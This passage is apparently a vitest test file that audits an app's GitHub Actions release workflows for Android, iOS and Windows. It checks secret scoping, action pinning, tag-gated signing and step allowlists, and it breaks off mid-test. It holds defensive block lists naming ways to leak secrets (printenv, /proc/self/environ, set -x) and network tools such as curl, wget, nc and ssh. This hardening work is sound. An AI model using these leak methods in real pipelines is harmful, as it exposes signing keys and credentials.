import { readdirSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { parse } from 'yaml';

const ROOT = join(import.meta.dirname, '..');

interface Step {
  name?: string;
  uses?: string;
  if?: string;
  run?: string;
  shell?: string;
  env?: Record<string, string>;
  with?: Record<string, unknown>;
}
interface Job {
  needs?: string | string[];
  if?: string;
  environment?: string;
  permissions?: Record<string, string>;
  secrets?: unknown;
  'timeout-minutes'?: number;
  'runs-on'?: string;
  env?: Record<string, string>;
  concurrency?: { group?: string; 'cancel-in-progress'?: boolean };
  steps: Step[];
}
interface Workflow {
  on: { push?: { tags?: string[]; branches?: string[] }; workflow_dispatch?: unknown };
  permissions?: Record<string, string>;
  concurrency?: { group?: string; 'cancel-in-progress'?: boolean };
  env?: Record<string, string>;
  jobs: Record<string, Job>;
}
interface Loaded {
  text: string;
  wf: Workflow;
}

function load(name: string): Loaded {
  const text = readFileSync(join(ROOT, '.github', 'workflows', `${name}.yml`), 'utf8');
  return { text, wf: parse(text) as Workflow };
}

const ci = load('ci');
const android = load('release-android');
const ios = load('release-ios');
const windows = load('release-windows');

const SECRET_REF = /\$\{\{\s*secrets\.([A-Z0-9_]+)\s*\}\}/g;
const secretsIn = (value: unknown): string[] => [...JSON.stringify(value ?? '').matchAll(SECRET_REF)].map((m) => m[1] ?? '');
const allSteps = (wf: Workflow): Step[] => Object.values(wf.jobs).flatMap((job) => job.steps);
const job = (wf: Workflow, id: string): Job => {
  const found = wf.jobs[id];
  if (found === undefined) throw new Error(`no job ${id}`);
  return found;
};
const step = (j: Job, name: string): Step => {
  const found = j.steps.find((s) => s.name === name);
  if (found === undefined) throw new Error(`no step named ${name}`);
  return found;
};
const mutate = (wf: Workflow, change: (copy: Workflow) => void): Workflow => {
  const copy = structuredClone(wf);
  change(copy);
  return copy;
};

const ANDROID_SECRETS = ['ANDROID_KEYSTORE_BASE64', 'ANDROID_KEYSTORE_PASSWORD', 'ANDROID_KEY_ALIAS', 'ANDROID_KEY_PASSWORD'];
const IOS_SECRETS = ['IOS_DISTRIBUTION_CERT_P12_BASE64', 'IOS_DISTRIBUTION_CERT_PASSWORD', 'APPSTORE_API_PRIVATE_KEY'];
const WINDOWS_SECRETS = ['AZURE_TENANT_ID', 'AZURE_CLIENT_ID', 'AZURE_CLIENT_SECRET'];

/** Every script line a step that holds a secret in its `env` may contain, whole-line. Any other step holding one, or any other line, is a violation. */
const ANDROID_SECRET_STEP_LINES: Record<string, string[]> = {
  'Decode the signing keystore': ['umask 077', 'printf \'%s\' "$ANDROID_KEYSTORE_BASE64" | base64 -d > "$RUNNER_TEMP/release-keystore.p12"'],
  'Align-check and sign the APK (v2 and v3 signatures)': [
    'set -eu',
    'version="$(node -p "require(\'./package.json\').version")"',
    'mkdir -p release',
    'zipalign -c -P 16 4 unsigned/app-release-unsigned.apk',
    'apksigner sign \\',
    '--ks "$RUNNER_TEMP/release-keystore.p12" \\',
    '--ks-pass env:ANDROID_KEYSTORE_PASSWORD \\',
    '--ks-key-alias "$ANDROID_KEY_ALIAS" \\',
    '--key-pass env:ANDROID_KEY_PASSWORD \\',
    '--v2-signing-enabled true \\',
    '--v3-signing-enabled true \\',
    '--out "release/InspectorHub-$version.apk" \\',
    'unsigned/app-release-unsigned.apk',
  ],
};
/** iOS hands the certificate, its password and the API key to actions through `with`. The one script step that may hold them in its env is the preflight, whose script is a single command that reads them and never prints a value. */
const IOS_PREFLIGHT_STEP = 'Check the Apple credentials are present';
const IOS_SECRET_STEP_LINES: Record<string, string[]> = {
  [IOS_PREFLIGHT_STEP]: ['node scripts/ios-release-preflight.mjs'],
};
const WINDOWS_SECRET_STEP_LINES: Record<string, string[]> = {
  'Sign the HEIC helper with Azure Artifact Signing': [
    "Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force -Scope CurrentUser",
    "Install-Module -Name TrustedSigning -MinimumVersion 0.5.0 -Force -Repository PSGallery -Scope CurrentUser",
    "$helper = (Resolve-Path 'dist-electron/native/win-heic-helper.exe').Path",
    'Invoke-TrustedSigning -Endpoint $env:AZURE_SIGNING_ENDPOINT -CertificateProfileName $env:AZURE_SIGNING_PROFILE -CodeSigningAccountName $env:AZURE_SIGNING_ACCOUNT -TimestampRfc3161 https://timestamp.acs.microsoft.com -TimestampDigest SHA256 -FileDigest SHA256 -Files $helper',
  ],
  'Build the NSIS installer': ['npx electron-builder --win nsis --x64 --config electron/builder/electron-builder.config.mjs --publish never'],
  'Build the signed unpacked Windows package': ['npx electron-builder --dir --win --x64 --config electron/builder/electron-builder.config.mjs --publish never'],
};

// ---- the checkers: each returns the list of violations, so a mutated copy can be shown to be rejected ----

/** No expression of any kind inside a script (an attacker-controlled name such as a branch or an input would run as shell), and only the default shell. */
function injection(wf: Workflow): string[] {
  const out: string[] = [];
  for (const [id, j] of Object.entries(wf.jobs)) {
    for (const s of j.steps) {
      if (s.run?.includes('${{') === true) out.push(`${id}/${s.name ?? s.run}: expression in run`);
      if (s.shell !== undefined && !['bash', 'pwsh'].includes(s.shell)) out.push(`${id}/${s.name ?? ''}: shell ${s.shell}`);
    }
  }
  return out;
}

/** A secret is only ever `secrets.NAME` with an allowed name, inside the env or with of a step. */
function secretUse(wf: Workflow, allowed: string[]): string[] {
  const out: string[] = [];
  if (secretsIn(wf.env).length > 0 || JSON.stringify(wf.env ?? {}).includes('secrets')) out.push('top-level env');
  for (const [id, j] of Object.entries(wf.jobs)) {
    if (j.secrets !== undefined) out.push(`${id}: secrets key (inherit)`);
    if (JSON.stringify(j.env ?? {}).includes('secrets')) out.push(`${id}: job env`);
    if (JSON.stringify(j.if ?? '').includes('secrets')) out.push(`${id}: job if`);
    const words = JSON.stringify(j).match(/\bsecrets\b/g)?.length ?? 0;
    const refs = secretsIn(j);
    if (words !== refs.length) out.push(`${id}: a secrets reference that is not secrets.NAME`);
    for (const ref of refs) if (!allowed.includes(ref)) out.push(`${id}: unknown secret ${ref}`);
    for (const s of j.steps) {
      for (const field of ['run', 'if', 'name', 'shell'] as const) {
        if (JSON.stringify(s[field] ?? '').includes('secrets')) out.push(`${id}/${s.name ?? ''}: secrets in ${field}`);
      }
    }
    if (refs.length > 0 && !j.environment) out.push(`${id}: holds a secret but names no environment`);
  }
  return out;
}

/** A step that holds a secret in its env is listed, and its script is exactly the listed lines. */
function secretSteps(wf: Workflow, rules: Record<string, string[]>): string[] {
  const out: string[] = [];
  for (const [id, j] of Object.entries(wf.jobs)) {
    for (const s of j.steps) {
      if (secretsIn(s.env).length === 0) continue;
      const lines = rules[s.name ?? ''];
      if (lines === undefined) {
        out.push(`${id}/${s.name ?? ''}: a secret in env of an unlisted step`);
        continue;
      }
      for (const raw of (s.run ?? '').split('\n')) {
        const line = raw.trim();
        if (line !== '' && !lines.includes(line)) out.push(`${id}/${s.name ?? ''}: unlisted line ${line}`);
      }
    }
  }
  return out;
}

const FORBIDDEN: [string, RegExp][] = [
  ['set -x', /set\s+-[a-z]*x/],
  ['bash -x', /bash\s+-[a-z]*x/],
  ['xtrace', /xtrace/],
  ['export -p', /export\s+-p/],
  ['declare -p', /declare\s+-p/],
  ['/proc/self/environ', /\/proc\/self\/environ/],
  ['::add-mask', /::add-mask/],
  ['ACTIONS_RUNNER_DEBUG', /ACTIONS_RUNNER_DEBUG/],
  ['ACTIONS_STEP_DEBUG', /ACTIONS_STEP_DEBUG/],
  ['printenv', /\bprintenv\b/],
  ['env pipe', /\benv\s*\|/],
  ['bare env', /^\s*env\s*$/m],
  ['key block', /-----BEGIN/],
  ['long base64', /[A-Za-z0-9+/=]{80,}/],
];
function forbiddenText(text: string): string[] {
  return FORBIDDEN.filter(([, re]) => re.test(text)).map(([name]) => name);
}

/** A script that calls the Gradle wrapper must not depend on the committed file mode. */
function gradlew(wf: Workflow): string[] {
  const out: string[] = [];
  for (const [id, j] of Object.entries(wf.jobs)) {
    for (const s of j.steps) {
      let chmod = false;
      for (const raw of (s.run ?? '').split('\n')) {
        const line = raw.trim();
        if (line.startsWith('chmod +x ./gradlew')) chmod = true;
        else if (line.includes('gradlew') && !chmod && !/^(sh|bash) \.\/gradlew/.test(line)) out.push(`${id}/${s.name ?? ''}: ${line}`);
      }
    }
  }
  return out;
}

/** Every checkout drops the token, and a job that handles the signing key restores no cache. */
function hygiene(wf: Workflow, signingJobs: string[]): string[] {
  const out: string[] = [];
  for (const [id, j] of Object.entries(wf.jobs)) {
    for (const s of j.steps) {
      if (s.uses?.startsWith('actions/checkout@') === true && s.with?.['persist-credentials'] !== false) out.push(`${id}: checkout keeps credentials`);
      if (signingJobs.includes(id) && s.uses?.startsWith('actions/setup-node@') === true && s.with?.cache !== undefined) out.push(`${id}: cache in a signing job`);
    }
  }
  return out;
}

/** Android: signing, its environment and the Release exist only for a tag; a dispatch from a branch builds unsigned and touches no secret. */
function androidGating(wf: Workflow): string[] {
  const out: string[] = [];
  const need = (label: string, ok: boolean) => {
    if (!ok) out.push(label);
  };
  need('sign if', job(wf, 'sign').if === "github.ref_type == 'tag'");
  need('sign environment', job(wf, 'sign').environment === 'android-release');
  need('sign needs build', job(wf, 'sign').needs === 'build');
  need('release if', job(wf, 'release').if === "github.event_name == 'push' && github.ref_type == 'tag'");
  need('release needs sign', job(wf, 'release').needs === 'sign');
  for (const id of ['verify', 'build', 'release']) {
    need(`${id} holds no secret`, secretsIn(job(wf, id)).length === 0);
    need(`${id} names no environment`, job(wf, id).environment === undefined);
  }
  need('only release writes', Object.entries(wf.jobs).every(([id, j]) => (id === 'release' ? j.permissions?.contents === 'write' : j.permissions === undefined)));
  return out;
}

/** iOS: only a tag ref reaches the signing job. */
function iosGating(wf: Workflow): string[] {
  const out: string[] = [];
  if (job(wf, 'testflight').if !== "github.ref_type == 'tag'") out.push('testflight if');
  if (job(wf, 'testflight').environment !== 'ios-release') out.push('testflight environment');
  if (secretsIn(job(wf, 'verify')).length > 0) out.push('verify holds a secret');
  if (job(wf, 'verify').environment !== undefined) out.push('verify names an environment');
  return out;
}

/** The order inside the Android signing job. */
function signOrder(wf: Workflow): string[] {
  const out: string[] = [];
  const j = job(wf, 'sign');
  const at = (name: string) => j.steps.findIndex((s) => s.name === name);
  const names = [
    'Select the pinned build tools',
    'Decode the signing keystore',
    'Align-check and sign the APK (v2 and v3 signatures)',
    'Verify the signature and the version',
    'Checksums',
  ];
  const indexes = names.map(at);
  if (indexes.some((i) => i < 0) || indexes.some((i, n) => n > 0 && i <= (indexes[n - 1] ?? 0))) out.push('step order');
  const last = j.steps[j.steps.length - 1];
  if (last?.name !== 'Delete the keystore' || last.if !== 'always()' || last.run !== 'rm -f "$RUNNER_TEMP/release-keystore.p12"') out.push('cleanup is not the last step with always()');
  const upload = j.steps.findIndex((s) => s.uses?.startsWith('actions/upload-artifact@') === true);
  if (upload < at('Checksums') || upload > j.steps.length - 2) out.push('upload position');
  return out;
}

/** The signed job uploads exactly the release directory. */
function uploadPaths(wf: Workflow): string[] {
  const out: string[] = [];
  const uploads = job(wf, 'sign').steps.filter((s) => s.uses?.startsWith('actions/upload-artifact@') === true);
  if (uploads.length !== 1) out.push('expected one upload');
  for (const u of uploads) if (u.with?.path !== 'release/') out.push(`upload path ${String(u.with?.path)}`);
  return out;
}

/** The steps of a signing job, by name (or by action without its commit, or by first script line). Nothing may be added, removed or reordered unnoticed. */
const label = (s: Step): string => s.name ?? (s.uses !== undefined ? s.uses.split('@')[0] ?? '' : `run: ${(s.run ?? '').split('\n')[0] ?? ''}`);
const withAction = (s: Step): string => (s.name !== undefined && s.uses !== undefined ? `${s.name} | ${s.uses.split('@')[0] ?? ''}` : label(s));

const EXPECTED_STEPS = {
  androidSign: [
    'actions/checkout',
    'actions/setup-node',
    'actions/download-artifact',
    'Select the pinned build tools',
    'Decode the signing keystore',
    'Align-check and sign the APK (v2 and v3 signatures)',
    'Verify the signature and the version',
    'Checksums',
    'actions/upload-artifact',
    'Delete the keystore',
  ],
  androidRelease: ['actions/download-artifact', 'Create the draft Release | softprops/action-gh-release'],
  iosTestflight: [
    'actions/checkout',
    'actions/setup-node',
    'Check the Apple credentials are present',
    'run: npm ci',
    'run: npm run build',
    'Set the iOS version from package.json and the build number from the run',
    'run: npx cap sync ios',
    'Require Xcode 26 or newer',
    'Warn when the encryption compliance code is not recorded',
    'Import the distribution certificate | apple-actions/import-codesign-certs',
    'Download the App Store provisioning profile | apple-actions/download-provisioning-profiles',
    'Fill in ExportOptions.plist',
    'Archive the app',
    'Export the IPA',
    'Check the IPA before upload',
    'Upload to TestFlight | apple-actions/upload-testflight-build',
  ],
  windowsSign: [
    'actions/checkout',
    'actions/setup-node',
    'run: npm ci',
    'run: npm run build',
    'run: npm run build:electron',
    'Build the Windows HEIC helper',
    'Sign the HEIC helper with Azure Artifact Signing',
    'Calculate the final helper SHA-256',
    'actions/upload-artifact',
    'Build the signed unpacked Windows package',
    'run: npm run check:electron-package',
    'Build the NSIS installer',
    'run: npm run check:electron-package',
    'Verify Authenticode and record publisher',
    'Create Windows SHA-256 checksums',
    'actions/upload-artifact',
  ],
  windowsRelease: ['actions/download-artifact', 'Create the draft Release | softprops/action-gh-release'],
};

/** Per job, the only actions it may use (by owner/repo). A new action fails until this list is edited on purpose. */
const ALLOWED_USES: Record<string, Record<string, string[]>> = {
  android: {
    verify: ['actions/checkout', 'actions/setup-node'],
    build: ['actions/checkout', 'actions/setup-node', 'actions/setup-java', 'actions/upload-artifact'],
    sign: ['actions/checkout', 'actions/setup-node', 'actions/download-artifact', 'actions/upload-artifact'],
    release: ['actions/download-artifact', 'softprops/action-gh-release'],
  },
  ios: {
    verify: ['actions/checkout', 'actions/setup-node'],
    testflight: ['actions/checkout', 'actions/setup-node', 'apple-actions/import-codesign-certs', 'apple-actions/download-provisioning-profiles', 'apple-actions/upload-testflight-build'],
  },
  windows: {
    verify: ['actions/checkout', 'actions/setup-node', 'actions/upload-artifact'],
    build: ['actions/checkout', 'actions/setup-node', 'actions/upload-artifact'],
    sign: ['actions/checkout', 'actions/setup-node', 'actions/upload-artifact'],
    release: ['actions/download-artifact', 'softprops/action-gh-release'],
  },
};

function stepAllowlist(j: Job, expected: string[]): string[] {
  const got = j.steps.map(withAction);
  return JSON.stringify(got) === JSON.stringify(expected) ? [] : [`steps differ: ${got.join(' > ')}`];
}

function usesAllowlist(wf: Workflow, allowed: Record<string, string[]>): string[] {
  const out: string[] = [];
  for (const [id, j] of Object.entries(wf.jobs)) {
    for (const s of j.steps) {
      const name = s.uses?.split('@')[0];
      if (name !== undefined && !(allowed[id] ?? []).includes(name)) out.push(`${id}: action ${name} is not allowed`);
    }
  }
  return out;
}

const KEYSTORE_STEPS = ['Decode the signing keystore', 'Align-check and sign the APK (v2 and v3 signatures)', 'Delete the keystore'];
const TOOLS = /\b(curl|wget|nc|ncat|scp|ssh|sftp|rsync|cp|mv|ln|tar|zip|openssl|keytool|python3?|perl|ruby)\b/;
const ENV_FILES = /GITHUB_(ENV|OUTPUT|PATH)/;
const PATH_STEP = 'Select the pinned build tools';
const PATH_LINE = 'echo "$tools" >> "$GITHUB_PATH"';

/** A signing job may not move, send or smuggle anything: no copy or network tool, no keystore path outside three steps, no write to the environment files except the one build-tools step, no keys that change how steps run. */
function signingJob(j: Job): string[] {
  const out: string[] = [];
  for (const key of ['continue-on-error', 'strategy', 'defaults', 'container', 'services']) if (key in j) out.push(`job key ${key}`);
  for (const s of j.steps) {
    const who = s.name ?? s.uses ?? '';
    if ('continue-on-error' in s) out.push(`${who}: continue-on-error`);
    const lines = (s.run ?? '').split('\n').map((l) => l.trim());
    for (const line of lines) {
      if (TOOLS.test(line) && !(s.name === 'Decode the signing keystore' && /^printf .* \| base64 -d > /.test(line))) out.push(`${who}: tool in ${line}`);
      if (/release-keystore|keystore\.p12/.test(line) && !KEYSTORE_STEPS.includes(s.name ?? '')) out.push(`${who}: keystore path outside its steps`);
      if (ENV_FILES.test(line) && !(s.name === PATH_STEP && line === PATH_LINE)) out.push(`${who}: write to an environment file`);
    }
    if (/base64/.test(s.run ?? '') && s.name !== 'Decode the signing keystore') out.push(`${who}: base64 outside the decode`);
  }
  return out;
}

/** The only lines of the Android signing job that mention the release directory, and the Release job's files. */
function releaseDir(wf: Workflow): string[] {
  const out: string[] = [];
  const lines = job(wf, 'sign').steps.flatMap((s) => (s.run ?? '').split('\n').map((l) => l.trim())).filter((l) => l.includes('release/'));
  const expected = ['--out "release/InspectorHub-$version.apk" \\', 'apk="release/InspectorHub-$version.apk"'];
  if (JSON.stringify(lines) !== JSON.stringify(expected)) out.push(`release/ lines: ${lines.join(' | ')}`);
  const create = job(wf, 'release').steps.find((s) => s.uses?.startsWith('softprops/action-gh-release@'));
  if (create?.with?.files !== 'release/*.apk\nrelease/SHA256SUMS\n') out.push('release files');
  if (job(wf, 'sign').steps.find((s) => s.name === 'Checksums')?.run !== 'sha256sum *.apk > SHA256SUMS') out.push('checksums');
  return out;
}

// ---- the real workflows ----

describe.each([
  ['release-android', android, ANDROID_SECRETS, ANDROID_SECRET_STEP_LINES, ['sign']],
  ['release-ios', ios, IOS_SECRETS, IOS_SECRET_STEP_LINES, ['testflight']],
  ['release-windows', windows, WINDOWS_SECRETS, WINDOWS_SECRET_STEP_LINES, ['sign']],
] as const)('%s workflow hardening', (_name, { text, wf }, allowed, rules, signing) => {
  it('runs on a pushed v* tag and by hand, and on nothing else', () => {
    expect(Object.keys(wf.on).sort()).toEqual(['push', 'workflow_dispatch']);
    expect(wf.on.push?.tags).toEqual(['v*']);
    expect(wf.on.push?.branches).toBeUndefined();
  });

  it('reads the repository by default; any write is granted to one named job', () => {
    expect(wf.permissions).toEqual({ contents: 'read' });
    for (const j of Object.values(wf.jobs)) {
      if (j.permissions !== undefined) expect(j.permissions).toEqual({ contents: 'write' });
    }
  });

  it('every job has a timeout and runs on a hosted runner, and each ref has its own concurrency group that never cancels a release', () => {
    for (const j of Object.values(wf.jobs)) {
      expect(typeof j['timeout-minutes']).toBe('number');
      expect(j['runs-on']).toMatch(/^(ubuntu-latest|macos-26|windows-latest)$/);
    }
    expect(wf.concurrency?.group).toContain('${{ github.ref }}');
    expect(wf.concurrency?.['cancel-in-progress']).toBe(false);
  });

  it('every action is pinned to a 40-hex commit with its tag in a comment (control: there are actions to check)', () => {
    const uses = text.split('\n').map((line) => line.replace(/\r$/, '')).filter((line) => /^\s*-?\s*uses:/.test(line));
    expect(uses.length).toBeGreaterThanOrEqual(6);
    for (const line of uses) expect(line, line).toMatch(/uses: [\w.-]+\/[\w.-]+@[0-9a-f]{40} # v\d+\.\d+\.\d+$/);
    expect(allSteps(wf).filter((s) => s.uses !== undefined)).toHaveLength(uses.length);
  });

  it('has none of the injection, secret-use, secret-step, forbidden-text, checkout and wrapper violations', () => {
    expect(injection(wf)).toEqual([]);
    expect(secretUse(wf, [...allowed])).toEqual([]);
    expect(secretSteps(wf, rules)).toEqual([]);
    expect(forbiddenText(text)).toEqual([]);
    expect(hygiene(wf, [...signing])).toEqual([]);
    expect(gradlew(wf)).toEqual([]);
    // Control: the checkers looked at something.
    expect(allSteps(wf).filter((s) => s.run !== undefined).length).toBeGreaterThan(5);
    expect([...text.matchAll(SECRET_REF)].length).toBeGreaterThan(0);
  });

  it('every secret reference in the text is inside the env or with of a step (none was missed by the structural walk)', () => {
    let seen = 0;
    for (const s of allSteps(wf)) seen += secretsIn(s.env).length + secretsIn(s.with).length;
    expect(seen).toBe([...text.matchAll(SECRET_REF)].length);
  });

  it('every credential input of an action is an expression, never a literal', () => {
    for (const s of allSteps(wf)) {
      for (const [key, value] of Object.entries(s.with ?? {})) {
        if (/pass|private-key|p12|secret|token/i.test(key)) expect(String(value), key).toMatch(/^\$\{\{ (secrets|vars)\./);
      }
    }
  });

  it('the verify job runs everything the CI verify job runs, holds no secret, and the tag must equal the package.json version', () => {
    const wanted = Object.values(ci.wf.jobs)
      .find((j) => j.steps.some((s) => s.run === 'npm run typecheck'))
      ?.steps.filter((s) => s.run !== undefined && !s.run.startsWith('npx cap sync') && !s.run.includes('api:types:check'))
      .map((s) => s.run);
    expect(wanted?.length).toBeGreaterThanOrEqual(5);
    const verify = job(wf, 'verify');
    for (const run of wanted ?? []) expect(verify.steps.map((s) => s.run), run).toContain(run);
    expect(verify.steps.some((s) => s.run?.includes('api:types:check'))).toBe(true);
    expect(secretsIn(verify)).toEqual([]);
    const tag = verify.steps.find((s) => s.run?.includes('GITHUB_REF_NAME'));
    expect(tag?.if).toBe("github.ref_type == 'tag'");
    expect(tag?.run).toContain("require('./package.json').version");
    expect(tag?.run).toMatch(/v\$\(|v\$version/);
    expect(tag?.run).toContain('exit 1');
    for (const [id, j] of Object.entries(wf.jobs)) {
      if (id !== 'verify') expect(j.needs, id).toBeDefined();
    }
  });
});

describe('release workflow job concurrency', () => {
  it('serializes Android, iOS, and Windows draft creation for the same ref', () => {
    for (const [workflow, id] of [[android.wf, 'release'], [ios.wf, 'testflight'], [windows.wf, 'release']] as const) {
      expect(job(workflow, id).concurrency).toEqual({
        group: 'release-assets-${{ github.ref }}',
        'cancel-in-progress': false,
      });
    }
  });
});

describe('Windows workflow hardening', () => {
  it('records the hosted Windows runner HEIF and HEVC extension inventory before building the helper', () => {
    const steps = job(ci.wf, 'windows').steps;
    const inventoryIndex = steps.findIndex((s) => s.name === 'Record Windows HEIF and HEVC codec inventory');
    const helperIndex = steps.findIndex((s) => (s.run ?? '').includes('build:heic-helper'));
    expect(inventoryIndex).toBeGreaterThanOrEqual(0);
    expect(inventoryIndex).toBeLessThan(helperIndex);
    const inventory = steps[inventoryIndex]?.run ?? '';
    expect(inventory).toContain('Get-AppxPackage');
    expect(inventory).toContain('Microsoft.HEIFImageExtension');
    expect(inventory).toContain('Microsoft.HEVCVideoExtension');
    expect(inventory).toContain('Get-AppxPackage -ErrorAction Stop');
    expect(inventory).toContain('Query scope:');
    expect(inventory).toContain('GITHUB_STEP_SUMMARY');
  });

  it('builds the real HEIC helper before packaging in CI and release verify', () => {
    const ciWindows = job(ci.wf, 'windows');
    const verify = job(windows.wf, 'verify');
    const assertHelperBeforePack = (steps: Step[], context: string) => {
      const helper = steps.findIndex((s) => (s.run ?? '').includes('build:heic-helper'));
      const pack = steps.findIndex((s) => (s.run ?? '').includes('electron-builder --dir'));
      expect(helper, `${context}: helper build step`).toBeGreaterThanOrEqual(0);
      expect(pack, `${context}: package step`).toBeGreaterThan(helper);
    };
    assertHelperBeforePack(ciWindows.steps, 'CI');
    assertHelperBeforePack(verify.steps, 'release verify');
    assertHelperBeforePack(job(windows.wf, 'sign').steps, 'release sign');
    expect(ciWindows.steps.some((s) => (s.run ?? '').includes('check:electron-bundle'))).toBe(true);
    expect(ciWindows.steps.some((s) => (s.run ?? '').includes('check:electron-package'))).toBe(true);
    for (const text of [ci.text, windows.text]) {
      expect(text).toContain('check:electron-package');
      expect(text).not.toMatch(/check-codec-review|libheif|check:third-party/);
    }
  });

  it('uploads the built helper with a checksum and 30-day retention', () => {
    for (const [workflow, artifactName] of [[ci.wf, 'windows-heic-helper'], [windows.wf, 'windows-heic-helper'], [windows.wf, 'windows-heic-helper-signed']] as const) {
      const candidate = Object.values(workflow.jobs).flatMap((j) => j.steps)
        .find((s) => s.uses?.startsWith('actions/upload-artifact@') && s.with?.name === artifactName);
      expect(candidate?.with?.path).toBe('dist-electron/native/win-heic-helper.exe');
      expect(candidate?.with?.['retention-days']).toBe(30);
      expect(Object.values(workflow.jobs).flatMap((j) => j.steps).some((s) => (s.run ?? '').includes('Get-FileHash'))).toBe(true);
    }
  });

  it('uses a post-sign helper hash and excludes only the helper from electron-builder signing', () => {
    const sign = job(windows.wf, 'sign');
    const azure = step(sign, 'Sign the HEIC helper with Azure Artifact Signing');
    expect(azure.if).toBe("env.OI_WINDOWS_SIGNING == 'azure'");
    const build = step(sign, 'Build the NSIS installer');
    expect(build.run).toContain('electron-builder --win nsis');
    expect(build.env?.AZURE_CLIENT_SECRET).toBe('${{ secrets.AZURE_CLIENT_SECRET }}');
  });

  it('uses tag-only protected signing and lets manual dispatch stop at the unsigned artifact', () => {
    expect(job(windows.wf, 'sign').environment).toBe('windows-release');
    expect(job(windows.wf, 'sign').if).toBe("github.event_name == 'push' && github.ref_type == 'tag'");
    expect(job(windows.wf, 'sign').needs).toBe('build');
    expect(job(windows.wf, 'release').concurrency).toEqual({
      group: 'release-assets-${{ github.ref }}',
      'cancel-in-progress': false,
    });
    expect(job(windows.wf, 'release').if).toBe("github.event_name == 'push' && github.ref_type == 'tag'");
    expect(job(windows.wf, 'release').needs).toBe('sign');
    expect(job(windows.wf, 'build').environment).toBeUndefined();
    expect(secretsIn(job(windows.wf, 'verify'))).toEqual([]);
    expect(secretsIn(job(windows.wf, 'build'))).toEqual([]);
  });

  it('keeps signing and draft release steps on their reviewed allowlists', () => {
    expect(stepAllowlist(job(windows.wf, 'sign'), EXPECTED_STEPS.windowsSign)).toEqual([]);
    expect(signingJob(job(windows.wf, 'sign'))).toEqual([]);
    expect(stepAllowlist(job(windows.wf, 'release'), EXPECTED_STEPS.windowsRelease)).toEqual([]);
    const create = step(job(windows.wf, 'release'), 'Create the draft Release');
    expect(create.with?.draft).toBe(true);
    expect(create.with?.fail_on_unmatched_files).toBe(true);
    expect(create.with?.files).toBe('release/InspectorHub-Setup-*.exe\nrelease/*.blockmap\nrelease/latest.yml\nrelease/SHA256SUMS-windows\n');
  });
});

describe('release-android specifics', () => {
  const { wf } = android;
  const build = job(wf, 'build');
  const sign = job(wf, 'sign');

  it('the real workflow passes the gating, order and upload checks (control for the fixtures below)', () => {
    expect(androidGating(wf)).toEqual([]);
    expect(signOrder(wf)).toEqual([]);
    expect(uploadPaths(wf)).toEqual([]);
  });

  it('the unsigned build job names no environment, reads no secret and calls the wrapper without depending on its file mode', () => {
    expect(build.environment).toBeUndefined();
    expect(secretsIn(build)).toEqual([]);
    const gradle = step(build, 'Build the unsigned release APK');
    expect(gradle.run).toBe('chmod +x ./gradlew\n./gradlew --no-daemon assembleRelease\n');
    expect(gradle['working-directory' as keyof Step]).toBe('android');
    const upload = build.steps.find((s) => s.uses?.startsWith('actions/upload-artifact@'));
    expect(upload?.with?.path).toBe('android/app/build/outputs/apk/release/app-release-unsigned.apk');
    expect(upload?.with?.name).toBe('android-unsigned');
  });

  it('gives each step only the secrets it needs', () => {
    expect(Object.keys(step(sign, 'Decode the signing keystore').env ?? {})).toEqual(['ANDROID_KEYSTORE_BASE64']);
    expect(Object.keys(step(sign, 'Align-check and sign the APK (v2 and v3 signatures)').env ?? {}).sort()).toEqual([
      'ANDROID_KEYSTORE_PASSWORD',
      'ANDROID_KEY_ALIAS',
      'ANDROID_KEY_PASSWORD',
    ]);
    expect(sign.steps.filter((s) => secretsIn(s).length > 0)).toHaveLength(2);
  });

  it('decodes the keystore under a restrictive umask into the runner temp directory, never into the workspace', () => {
    const decode = step(sign, 'Decode the signing keystore').run ?? '';
    expect(decode).toContain('umask 077');
    expect(decode).toContain('$RUNNER_TEMP/release-keystore.p12');
    expect(decode).not.toContain('GITHUB_WORKSPACE');
  });

  it('pins one build-tools version and fails with a message when it is not there', () => {
    expect(wf.env?.BUILD_TOOLS_VERSION).toBe('36.0.0');
    const select = step(sign, 'Select the pinned build tools').run ?? '';
    expect(select).toContain('$ANDROID_HOME/build-tools/$BUILD_TOOLS_VERSION');
    expect(select).toContain('::error::Build tools $BUILD_TOOLS_VERSION are not available');
    expect(select).toContain('exit 1');
    expect(select).not.toContain('sort -V');
  });

  it('signs with apksigner (v2 and v3, never the default v1-only jarsigner) and verifies both schemes and the version', () => {
    const run = step(sign, 'Align-check and sign the APK (v2 and v3 signatures)').run ?? '';
    expect(run).toContain('apksigner sign');
    expect(run).toContain('--v2-signing-enabled true');
    expect(run).toContain('--v3-signing-enabled true');
    expect(run).not.toContain('jarsigner');
    const verify = step(sign, 'Verify the signature and the version').run ?? '';
    expect(verify).toContain('apksigner verify --verbose --print-certs');
    expect(verify).toContain('Verified using v2 scheme (APK Signature Scheme v2): true');
    expect(verify).toContain('Verified using v3 scheme (APK Signature Scheme v3): true');
    expect(verify).toContain("versionName='$version'");
    expect(verify).toContain('GITHUB_STEP_SUMMARY');
    expect(verify).toContain('certificate SHA-256 digest');
  });

  it('publishes checksums and creates a draft Release that the workflow never publishes', () => {
    expect(step(sign, 'Checksums').run).toBe('sha256sum *.apk > SHA256SUMS');
    const release = job(wf, 'release');
    expect(release.permissions).toEqual({ contents: 'write' });
    const create = step(release, 'Create the draft Release');
    expect(create.with?.draft).toBe(true);
    expect(String(create.with?.files)).toContain('release/SHA256SUMS');
    expect(String(create.with?.files)).toContain('release/*.apk');
  });
});

describe('release-ios specifics', () => {
  const { wf } = ios;
  const testflight = job(wf, 'testflight');

  it('the real workflow passes the gating check (control for the fixtures below)', () => {
    expect(iosGating(wf)).toEqual([]);
  });

  it('is written to the plan: macos-26, an environment, xcodebuild archive and export, the App Store Connect export method, encryption declared', () => {
    expect(testflight['runs-on']).toBe('macos-26');
    expect(testflight.needs).toBe('verify');
    // Archive and export are xcodebuild calls (Capacitor's build command is no longer used); the export method lives in the options template.
    const archive = step(testflight, 'Archive the app').run ?? '';
    expect(archive).toContain('xcodebuild archive');
    const exported = step(testflight, 'Export the IPA').run ?? '';
    expect(exported).toContain('xcodebuild -exportArchive');
    expect(testflight.steps.some((s) => (s.run ?? '').includes('cap build ios'))).toBe(false);
    expect(readFileSync(join(ROOT, 'ios', 'ExportOptions.plist'), 'utf8')).toMatch(/<key>method<\/key>\s*<string>app-store-connect<\/string>/);
    const upload = testflight.steps.find((s) => s.uses?.startsWith('apple-actions/upload-testflight-build@'));
